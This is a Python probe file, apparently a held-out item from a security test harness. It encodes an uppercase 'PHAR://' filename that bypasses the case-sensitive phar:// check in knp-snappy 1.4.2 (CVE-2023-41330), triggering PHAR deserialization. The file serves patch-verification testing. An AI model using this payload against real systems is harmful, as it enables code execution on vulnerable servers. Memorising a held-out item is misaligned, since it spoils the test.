#!/usr/bin/env python3
"""[HELD-OUT] CVE-2023-41330 residual — uppercase PHAR:// bypass.

The CVE-2023-28115 fix in knp-snappy 1.4.2 checks:
    strpos($filename, 'phar://') === 0
This is CASE-SENSITIVE: 'PHAR://' does not match.  PHP stream wrappers are
case-insensitive, so file_exists('PHAR:///app/evil.phar/x') still triggers
PHAR metadata deserialization on PHP 7.x.

Contract: reaches flag on V1 (1.4.2 — case-sensitive check bypassed),
          blocked on V2 (1.4.3 — allowlist + mb_strtolower).
"""
from __future__ import annotations

# Uppercase PHAR:// — bypasses the case-sensitive strpos check.
PHAR_PATH = "PHAR:///app/evil.phar/x"


def candidate() -> dict:
    """The request candidate for this bypass."""
    return {
        "probe_id": "cve-2023-41330-uppercase-phar",
        "filename": PHAR_PATH,
    }


if __name__ == "__main__":
    print(candidate()["filename"])
